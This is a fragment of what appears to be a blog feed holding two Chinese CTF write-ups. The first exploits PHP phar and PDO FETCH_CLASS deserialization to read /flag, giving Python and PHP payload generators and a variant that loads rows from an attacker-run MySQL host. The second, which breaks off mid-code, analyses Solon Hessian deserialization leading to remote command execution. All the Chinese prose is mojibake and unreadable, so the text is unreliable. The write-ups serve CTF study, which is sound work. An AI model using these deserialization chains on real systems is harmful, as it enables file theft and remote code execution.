class="hljs-variable">$value</span>;<br>    <span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/log/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$a</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦æ„é€ æ•°æ®åº“è§¦å‘è¿™é‡Œçš„<code>__set</code>é­”æœ¯æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥ä»»æ„æ–‡ä»¶å­˜å–äº†ã€‚</p><p>éœ€è¦æ‰“çš„éƒ¨åˆ†å°±æ˜¯è¿™ä¸ª<code>ATTR_DEFAULT_FETCH_MODE</code>ã€‚</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207182539727.png" alt="image-20250207182539727"></p><p>å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p>ä¸å‡ºç½‘çš„æƒ…å†µä¸‹å½“ç„¶æ˜¯è¦é€‰æ‹©<code>sqlite</code>è¿™ç§åŸºäºæ–‡ä»¶çš„æ•°æ®åº“ï¼Œå¦‚æœå‡ºç½‘ä¹Ÿå¯ä»¥ç›´æ¥è¿åˆ°<code>vps</code>ä¸Šçš„<code>mysql</code>ã€‚</p><p>é€šè¿‡User::__destruct<code>-&gt;</code>User::log ,User::logæŒ‡å®šæŸ¥è¯¢æ•°æ®åº“æ¥æºï¼Œè®¾å®š<code>&quot;options&quot;=&gt;[PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_CLASS|PDO::FETCH_CLASSTYPE,]]</code>,ä½¿å¾—æŸ¥è¯¢ç»“æœï¼Œç¬¬ä¸€åˆ—è¿”å›ç»“æœä½œä¸ºç±»åå®ä¾‹åŒ–ï¼Œä¹‹åçš„ç»“æœä¼šå˜æˆå±æ€§åå’Œå±æ€§å€¼è¿›è¡Œèµ‹å€¼ï¼Œå¯¹äºæœªå®šä¹‰çš„å±æ€§ä¼šè§¦å‘è¿™ä¸ªç±»çš„<code>__set</code>æ–¹æ³•ã€‚æ•°æ®åº“ç¬¬ä¸€è¡Œç»“æœä¸º<code>UserMessage</code>,æ‰€ä»¥ä¼šå®ä¾‹åŒ–<code>UserMessage</code>ã€‚</p><p>ç”¨pythonç”Ÿæˆä¸ª<code>sqlite</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> base64<br><br>path = <span class="hljs-string">&quot;test.db&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_db</span>(<span class="hljs-params">db_path</span>):<br>    conn = sqlite3.connect(db_path)<br>    cursor = conn.cursor()<br>    cursor.execute(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    CREATE TABLE IF NOT EXISTS users (</span><br><span class="hljs-string"></span><br><span class="hljs-string">        username TEXT NOT NULL,</span><br><span class="hljs-string">        filePath TEXT NOT NULL,</span><br><span class="hljs-string">        password TEXT NOT NULL,</span><br><span class="hljs-string"></span><br><span class="hljs-string">        id INTEGER PRIMARY KEY AUTOINCREMENT</span><br><span class="hljs-string">    )</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>    users = [<br>        (<span class="hljs-string">&#x27;UserMessage&#x27;</span>, <span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;/flag&#x27;</span>),<br>    ]<br>    cursor.executemany(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    INSERT INTO users (username, password,filePath) VALUES (?,?,?)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, users)<br>    conn.commit()<br>    cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>)<br>    conn.close()<br><br>gen_db(path)<br><br>origin_data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.db&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read();<br><span class="hljs-built_in">print</span>(base64.b64encode(origin_data))<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†filePathèµ‹å€¼ä¸º&#x2F;flagï¼Œä¹‹åçš„å˜é‡ï¼Œpasswordå’Œidï¼Œç”±äºæœªè¢«å®šä¹‰ä¼šè§¦å‘<code>__set</code>ï¼Œä»è€Œè¯»å–&#x2F;flagã€‚</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193349391.png" alt="image-20250207193349391"></p><p>ç„¶åå°±æ˜¯å†™å…¥sqliteæ–‡ä»¶ï¼Œä¿®æ”¹phpæ–‡ä»¶çš„æ•°æ®æºç”Ÿæˆpharï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = []; <span class="hljs-comment">//use to set options of PDO connections</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;con_options = [<br>            <span class="hljs-string">&quot;dsn&quot;</span> =&gt; <span class="hljs-string">&#x27;sqlite:/var/www/html/txt/4e118980578d4c903bd6a36b51c93da1.txt&#x27;</span>,<br>            <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;options&quot;</span> =&gt; [PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="hljs-variable constant_">FETCH_CLASS</span> | PDO::<span class="hljs-variable constant_">FETCH_CLASSTYPE</span>,]<br>        ];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&quot;UserMessage&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;shell.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span> . <span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;a.txt&quot;</span>, <span class="hljs-string">&quot;aaaaaaaaaaaaa&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;shell.phar&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_contents</span>));<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯å‡ºç½‘å¯ä»¥ç”¨è‡ªå·±çš„mysqlå•¥çš„æ­ä¸€ä¸ªå½¢å¦‚è¿™æ ·çš„è¡¨ï¼š</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193637143.png" alt="image-20250207193637143"></p><p>æ‰“pharæ”¹ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=vps:3306;dbname=users;charset=utf8&quot;</span>,<br><span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;vps&#x27;</span>,<br><span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br><span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<br><span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br><span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="hljs-number">262152</span>,<br>PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br>);<br></code></pre></td></tr></table></figure><p>å› ä¸ºï¼š</p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193800192.png" class="" title="image-20250207193800192"><p>gxnå¸ˆå‚…çº¯èµ›æ£å•Šã€‚</p><p>æ­£å¸¸ä¸å‡ºç½‘æ‰“æ³•å°±æ˜¯ä¸‹é¢ï¼š</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193357209.png" alt="image-20250207193357209"></p><p>ç„¶ådeleteè§¦å‘pharï¼š</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193402460.png" alt="image-20250207193402460"></p><p>ç„¶åè®¿é—®logä¸‹&#x2F;flagçš„md5è·¯å¾„ï¼Œå°±èƒ½çœ‹åˆ°flagäº†ï¼š</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207193418690.png" alt="image-20250207193418690"></p><p>æ€è·¯æ— æ•Œäº†ã€‚ç¡®å®èµ›æ£é¢˜ç›®ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">DASCTF 2024æœ€åä¸€æˆ˜-WEB-gxngxngxn - gxngxngxn - åšå®¢å›­</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2#WLMQy">DASCTF2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç«  å®˜æ–¹WP</a></p><p><a href="https://blog.lie.moe/2024/12/22/dasctf_2024.12_writeup/">DASCTF 2024æœ€åä¸€æˆ˜ WriteUpé¢˜è§£ | æ¢“æ¼ªã®çª</a></p><p><a href="https://xu17.top/2024/12/23/2024DASCTF/#yaml">DASCTF 2024æœ€åä¸€æˆ˜ wp - XU17</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/#strange-php%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">(ãƒ»Ï‰&lt; )â˜…DASCTF x 0psu3 2024æœ€åä¸€æˆ˜ | é›²æµã®Lowest World</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2025/ç¬¬äºŒå±Šé•¿åŸæ¯1è§£é¢˜-bookmanageræµ…æ</title>
    <link href="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/"/>
    <url>/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å½“æ—¶æœŸæœ«å¤ä¹ å»äº†æ²¡çœ‹å›½èµ›é¢˜ï¼Œå›å¤´å‘ç°ä¸€é“æœ‰æ„æ€çš„é¢˜ã€‚</p><p>åˆæ˜¯solonæ¡†æ¶ï¼Œæƒ³èµ·äº†å»å¹´æˆ‘æ‰“å›½èµ›æ—¶çš„å¿ƒæƒ…hhh</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åœ¨<code>ApiGateway</code>ä¸­å®šä¹‰äº†è·¯ç”±ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å°†<code>BookServiceImpl</code>è¿™ä¸ªç±»åŠ å…¥åˆ°bookè¿™ä¸ªè·¯å¾„ä¸‹ï¼Œä¹Ÿå°±è¯´è®¿é—®çš„è¯å°±æ˜¯<code>/api/rest/book/xxx</code>ï¼š</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163149854.png" alt="image-20250205163149854"></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>/api/rest/book/getBook</code>ï¼Œ<code>/api/rest/book/getAllBooks</code>ç­‰æ¥è®¿é—®è·¯ç”±ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> server.dso.service;<br><br><span class="hljs-keyword">import</span> common.BookModel;<br><span class="hljs-keyword">import</span> common.BookService;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Component;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Inject;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.Result;<br><span class="hljs-keyword">import</span> server.dso.dao.BookDao;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookService</span> &#123;<br>    <span class="hljs-meta">@Inject</span><br>    BookDao bookDao;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BookServiceImpl</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getBook&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;BookModel&gt; <span class="hljs-title function_">getBook</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-type">BookModel</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.getBookByTitle(name);<br>        <span class="hljs-keyword">return</span> book == <span class="hljs-literal">null</span> ? Result.failure(<span class="hljs-string">&quot;æœªæ‰¾åˆ°è¯¥ä¹¦ç±&quot;</span>) : Result.succeed(book);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getAllBooks&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;BookModel&gt;&gt; <span class="hljs-title function_">getAllBooks</span><span class="hljs-params">()</span> &#123;<br>        List&lt;BookModel&gt; books = <span class="hljs-built_in">this</span>.bookDao.getAllBooks();<br>        <span class="hljs-keyword">return</span> Result.succeed(books);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/getBookById&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;BookModel&gt; <span class="hljs-title function_">getBookById</span><span class="hljs-params">(<span class="hljs-type">long</span> bookId)</span> &#123;<br>        <span class="hljs-type">BookModel</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.getBookById(bookId);<br>        <span class="hljs-keyword">return</span> book == <span class="hljs-literal">null</span> ? Result.failure(<span class="hljs-string">&quot;æœªæ‰¾åˆ°è¯¥ä¹¦ç±&quot;</span>) : Result.succeed(book);<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/addBook&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">addBook</span><span class="hljs-params">(BookModel book)</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isAdded</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.bookDao.addBook(book);<br>        <span class="hljs-keyword">return</span> isAdded ? Result.succeed(<span class="hljs-string">&quot;å›¾ä¹¦æ·»åŠ æˆåŠŸ&quot;</span>) : Result.failure(<span class="hljs-string">&quot;å›¾ä¹¦æ·»åŠ å¤±è´¥&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨solonæ¡†æ¶githubé¡µçš„issueå¤„ï¼š<a href="https://github.com/opensolon/solon/issues/73/">https://github.com/opensolon/solon/issues/73/</a></p><p>å½“ä½¿ç”¨æ¡†æ¶çš„<a href="https://solon.noear.org/article/212">GateWay</a>ï¼Œå¹¶ä¸”å¼•å…¥å®˜æ–¹ä¾èµ–<code>solon.serialization.hessian</code>æ—¶ï¼Œå¦‚æœè¯·æ±‚çš„<code>api</code>å¸¦æœ‰å‚æ•°ï¼Œè¯·æ±‚åŒ…çš„<code>body</code>éƒ¨åˆ†ä¼šç”¨<code>hessian</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œ ä»è€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><p>è¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹Content-Typeï¼Œå½¢å¦‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/rest/book/addBook</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/hessian<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<br><br><span class="language-ebnf"></span><br><span class="language-ebnf"><span class="hljs-attribute">xxxxxx</span></span><br></code></pre></td></tr></table></figure><p>å‘åŒ…å¯ä»¥çœ‹åˆ°ä¼šå°†<code>body</code>çš„å†…å®¹è¿›è¡Œ<code>hessian2</code>ååºåˆ—åŒ–æ“ä½œ:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.noear.solon.serialization.hessian/HessianActionExecutor.java<br></code></pre></td></tr></table></figure><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163412584.png" alt="image-20250205163412584"></p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">changeBody:<span class="hljs-number">177</span>, HessianActionExecutor (org.noear.solon.serialization.hessian)<br>buildArgs:<span class="hljs-number">61</span>, ActionExecuteHandlerDefault (org.noear.solon.core.handle)<br>executeHandle:<span class="hljs-number">47</span>, ActionExecuteHandlerDefault (org.noear.solon.core.handle)<br>executeDo:<span class="hljs-number">329</span>, Action (org.noear.solon.core.handle)<br>invoke0:<span class="hljs-number">268</span>, Action (org.noear.solon.core.handle)<br>invoke:<span class="hljs-number">215</span>, Action (org.noear.solon.core.handle)<br>handle0:<span class="hljs-number">224</span>, Gateway (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">206</span>, Gateway (org.noear.solon.core.handle)<br>doFilter:-<span class="hljs-number">1</span>, <span class="hljs-number">521960438</span> (org.noear.solon.core.handle.Gateway$$Lambda$<span class="hljs-number">64</span>)<br>doFilter:<span class="hljs-number">24</span>, FilterChainImpl (org.noear.solon.core.handle)<br>handle:<span class="hljs-number">167</span>, Gateway (org.noear.solon.core.handle)<br>handleMain:<span class="hljs-number">33</span>, RouterHandler (org.noear.solon.core.route)<br>handleDo:<span class="hljs-number">64</span>, RouterHandler (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">24</span>, RouterHandler (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">47</span>, RouterInterceptorLimiter (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">27</span>, RouterInterceptorChainImpl (org.noear.solon.core.route)<br>doIntercept:<span class="hljs-number">97</span>, ChainManager (org.noear.solon.core)<br>handle:<span class="hljs-number">93</span>, RouterHandler (org.noear.solon.core.route)<br>handle:<span class="hljs-number">41</span>, HandlerPipeline (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">473</span>, SolonApp (org.noear.solon)<br>doFilter:-<span class="hljs-number">1</span>, <span class="hljs-number">1018937824</span> (org.noear.solon.SolonApp$$Lambda$<span class="hljs-number">15</span>)<br>doFilter:<span class="hljs-number">24</span>, FilterChainImpl (org.noear.solon.core.handle)<br>doFilter:<span class="hljs-number">49</span>, ChainManager (org.noear.solon.core)<br>tryHandle:<span class="hljs-number">419</span>, SolonApp (org.noear.solon)<br>handle:-<span class="hljs-number">1</span>, <span class="hljs-number">1506809545</span> (org.noear.solon.boot.jlhttp.XPluginImp$$Lambda$<span class="hljs-number">76</span>)<br>handleDo:<span class="hljs-number">42</span>, JlHttpContextHandler (org.noear.solon.boot.jlhttp)<br>serve:<span class="hljs-number">22</span>, JlHttpContextHandler (org.noear.solon.boot.jlhttp)<br>serve:<span class="hljs-number">2253</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleMethod:<span class="hljs-number">2215</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleTransaction:<span class="hljs-number">2154</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>handleConnection:<span class="hljs-number">2114</span>, HTTPServer (org.noear.solon.boot.jlhttp)<br>execute:<span class="hljs-number">1895</span>, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)<br>lambda$run$<span class="hljs-number">0</span>:<span class="hljs-number">1867</span>, HTTPServer$SocketHandlerThread (org.noear.solon.boot.jlhttp)<br>run:-<span class="hljs-number">1</span>, <span class="hljs-number">571100326</span> (org.noear.solon.boot.jlhttp.HTTPServer$SocketHandlerThread$$Lambda$<span class="hljs-number">83</span>)<br>runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æŸ¥çœ‹æºç ä¼šå‘ç°readObjectä¹‹å‰æœ‰ä¸ªåˆ¤æ–­ï¼Œä¸éš¾çœ‹å‡ºæ˜¯KMPç®—æ³•çš„å­—ç¬¦ä¸²åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯å¼„äº†ä¸ªblacklistçš„è¿‡æ»¤ï¼š</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205163958310.png" alt="image-20250205163958310"></p><p><code>testCases</code>å†…å®¹ç®€å•è½¬æ¢ä¸€ä¸‹ï¼Œå¯å¾—åˆ°é»‘åå•ï¼š</p><figure class="highlight java"><table><tr><td 